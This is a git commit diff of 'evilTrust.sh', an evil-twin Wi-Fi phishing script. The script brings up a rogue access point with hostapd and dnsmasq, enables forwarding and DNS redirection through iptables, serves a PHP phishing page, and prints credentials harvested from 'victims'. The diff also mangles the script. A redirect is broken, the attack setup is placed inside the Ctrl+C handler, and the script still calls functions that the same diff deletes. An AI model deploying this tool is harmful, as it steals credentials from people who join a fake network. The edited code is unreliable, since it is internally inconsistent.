135962a17094aa35d431d6ef47d2f52b2744630c
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-12-26 19:08:17 -0300

    Update evilTrust.sh

--- evilTrust.sh
+++ evilTrust.sh
@@ -1,105 +1,50 @@
 #!/bin/bash
 
+# evilTrust v2.0, Autor @s4vitar (Marcelo Vázquez)
+
+# Cores
+corVerde="\e[0;32m\033[1m"
+corFim="\033[0m\e[0m"
+corVermelha="\e[0;31m\033[1m"
+corAzul="\e[0;34m\033[1m"
+corAmarela="\e[0;33m\033[1m"
+corRoxa="\e[0;35m\033[1m"
+corTurquesa="\e[0;36m\033[1m"
+corCinza="\e[0;37m\033[1m"
+
 trap ctrl_c INT
 
-function ctrl_c() {
-    echo -e "\n\nExiting...\n"
-    rm dnsmasq.conf hostapd.conf 2>/dev/null
-    rm -r iface 2>/dev/null
-    find -name datos-privados.txt | xargs rm 2>/dev/null
-    sleep 3
-    ifconfig wlan0mon down 2>/dev/null
-    sleep 1
-    iwconfig wlan0mon mode monitor 2>/dev/null
-    sleep 1
-    ifconfig wlan0mon up 2>/dev/null
-    airmon-ng stop wlan0mon > /dev/null 2>&1
-    sleep 1
-    service network-manager restart
-    exit 0
-}
+function ctrl_c(){
+        echo -e "\n\n${corAmarela}[*]${corFim}${corCinza} Saindo...\n${corFim}"
+        rm dnsmasq.conf hostapd.conf 2>/dev/null
+        rm -r iface 2>/dev/null
+        find \-name datos-privados.txt | xargs rm 2>/dev/null
+        sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
+        iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
+        ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > / dnsmasq.conf
+        dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+        sleep 2
 
-function dependencies() {
-    sleep 1.5
-    counter=0
-    echo -e "\nChecking required programs...\n" sleep 1
-    dependencias=(php dnsmasq hostapd)
+        echo -e "[*] Iniciando o servidor DHCP..."
+        ifconfig $choosed_interface 192.168.1.1 netmask 255.255.255.0 > /dev/null 2>&1
+        sleep 2
 
-    for programa in "${dependencias[@]}"; do
-        if [ "$(command -v $programa)" ]; then
-            echo -e "The tool $programa is installed"
-            let counter+=1
-        else
-            echo -e "The tool $programa is not installed"
-        fi
-        sleep 0.4
-    done
+        echo -e "[*] Ativando IP forwarding...\n"
+        echo 1 > /proc/sys/net/ipv4/ip_forward
+        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+        iptables -A FORWARD -i $choosed_interface -o eth0 -j ACCEPT
+        sleep 2
 
-    if [ "$(echo $counter)" == "3" ]; then
-        echo -e "\nStarting...\n"
+        echo -e "[*] Iniciando o serviço DNS spoofing...\n"
+        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 8.8.8.8
+        iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to 8.8.8.8
+        sleep 2
+
+        echo -e "[*] Iniciando o ataque...\n"
+        xterm -e "php -S 192.168.1.1:80 -t $PWD" &
         sleep 3
-    else
-        echo -e "It is necessary to have the tools php, dnsmasq, and hostapd installed to run this script\n"
-        exit
-    fi
+
+        dependencies; getCredentials
 }
 
-function getCredentials() {
-    activeHosts=0
-    while true; do
-        echo -e "\nWaiting for credentials (Ctrl+C to exit)...\n"
-        for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
-        echo -e "Connected victims: $activeHosts\n"
-        find -name datos-privados.txt | xargs cat 2>/dev/null
-        for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
-        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
-        sleep 3
-        clear
-    done
-}
-
-function startAttack() {
-    clear
-    if [[ -e credenciales.txt ]]; then
-        rm -rf credenciales.txt
-    fi
-
-    echo -e "\nListing available network interfaces..."
-    sleep 1
-
-    airmon-ng start wlan0 > /dev/null 2>&1
-    interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
-    counter=1
-    for interface in $(cat iface); do
-        echo -e "\t$counter. $interface"
-        sleep 0.26
-        let counter++
-    done
-
-    checker=0
-    while [ $checker -ne 1 ]; do
-        echo -ne "\nChoose an interface (enter the corresponding number): " && read interface_number
-
-        if [[ "$interface_number" =~ ^[0-9]+$ ]]; then
-            if [ $interface_number -ge 1 ] && [ $interface_number -le $counter ]; then
-                choosed_interface=$(sed ''$interface_number'q;d' iface)
-                checker=1
-            else
-                echo -e "Invalid number. Please choose a valid one."
-            fi
-        else
-            echo -e "Invalid input. Please enter a number."
-        fi
-    done
-
-}
-
-case "$1" in --stop) stop ;;
- *) ;;
-createserver
-;;
-server 
-;;
-startAttack 
-;;
-esac
+dependencies; startAttack
